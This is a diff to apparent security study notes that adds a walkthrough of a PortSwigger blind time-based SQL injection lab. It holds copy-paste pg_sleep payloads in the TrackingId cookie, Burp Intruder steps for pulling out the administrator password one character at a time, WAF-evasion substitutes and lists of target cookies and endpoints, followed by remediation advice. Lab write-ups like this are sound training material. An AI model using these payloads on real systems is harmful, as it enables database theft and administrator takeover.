@@ -1815,7 +1815,7 @@ SUBSTR(password,P,1)='x'
 
 ---
 
-# Blind Error-Based SQL Injection — TrackingId Cookie (PortSwigger / lab-style)
+# Lab-11 Blind Error-Based SQL Injection — TrackingId Cookie (PortSwigger / lab-style)
 
 ---
 
@@ -1960,5 +1960,157 @@ The page does not display query results, but *database error messages leak inter
 - Disable detailed SQL errors in production  
 - Validate cookie format (UUID)  
 - Apply least-privilege DB permissions
+
+---
+
+# Lab-12 Blind Time-Based SQL Injection — TrackingId Cookie (PortSwigger / lab-style)
+
+---
+
+## 🔹 One-line summary
+Blind time-based SQL injection inside the `TrackingId` cookie leaks the administrator password through controlled database delays.
+
+---
+
+## 🔹 What is this topic? (short)
+Time-based blind SQLi occurs when:
+- The app shows **no errors**
+- Does **not reflect output**
+- Returns **same response always**
+
+But attackers can force the database to **sleep** (delay) when a condition is TRUE.
+
+By observing response time, we extract:
+- user existence
+- password length
+- each character of password
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- Works even when errors/output are hidden  
+- Bypasses WAF filters and validation  
+- Used widely in pentests & bug bounty  
+- Can extract full DB contents using only page timing  
+- Leads to full admin takeover
+
+---
+
+## 🔹 High-value injection points
+Tracking and analytics cookies:
+- `TrackingId`
+- `sessionid`
+- `auth_token`
+- `VisitorId`
+
+Endpoints:
+- `/`
+- `/analytics`
+- `/track`
+- `/monitor`
+- `/api/*`
+- login backends
+
+---
+
+## 🔹 Quick concept checklist
+- Use `pg_sleep()` (PostgreSQL)
+- TRUE → delayed response  
+- FALSE → instant response  
+- Extract:
+  - user existence  
+  - password length  
+  - each character using SUBSTRING  
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+### Step 1 — Test timing-based injection
+Send timing payload:
+TrackingId=x'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+Delay ≈ 10s → TRUE branch executed.
+
+Test FALSE:
+TrackingId=x'; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+Instant response → FALSE confirmed.
+
+---
+
+### Step 2 — Check if administrator user exists
+TrackingId=x'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+10-second delay → `administrator` exists.
+
+---
+
+### Step 3 — Enumerate password length
+
+Test lengths until delay stops:
+TrackingId=x'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+Increment `>2`, `>3`, `>4`, … → final result:  
+**Password length = 20**
+
+---
+
+### Step 4 — Extract password characters (intruder)
+
+Character-by-character extraction:
+TrackingId=x'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+Mark attack position with Intruder markers:
+'=§a§'
+
+Payload set:  
+`a–z`, `0–9`
+
+Use 1 thread → time-based precision.
+
+10-second response → correct character found.
+
+Repeat for positions 1 → 20:
+SUBSTRING(password,2,1) SUBSTRING(password,3,1) ... SUBSTRING(password,20,1)
+
+### Step 5 - Admininistrator Login
+
+EXtract password char by char to fetch admin password.Go to my account and enter credentials and boom lab is solved.
+
+---
+
+## 🧾 Evidence (Screenshots)
+
+1️⃣ **Screenshot — TRUE timing delay payload**  
+![Timing delay check with boolean condition](../images/true_delay_test.png)
+
+2️⃣ **Screenshot — administrator user existence confirmed**  
+![Admin exists](../images/admin_exists.png)
+
+3️⃣ **Screenshot — password length extraction**  
+![password length](../images/password_length.png)
+
+4️⃣ **Screenshot — Intruder extracting characters one-by-one**  
+![char by char password](../images/intruder_bruteforce.png)
+
+---
+
+## 🔹 Troubleshooting
+- No timing difference → response delay threshold too small (increase to 8–12s)
+- WAF blocks `pg_sleep()` → try:
+  - `SLEEP()`
+  - `benchmark(50000000,md5(1))`
+- If multiple DB rows cause noise → add `LIMIT 1`
+- If cookie too long → remove original value
+
+---
+
+## 🔹 Fixes / remediation
+- Use prepared SQL statements  
+- Never insert cookie values directly  
+- Normalize tracking IDs (UUID only)  
+- Block dangerous functions (`pg_sleep`, `SLEEP`, `WAITFOR`)  
+- Add uniform response time (mitigates timing leaks)
 
 ---
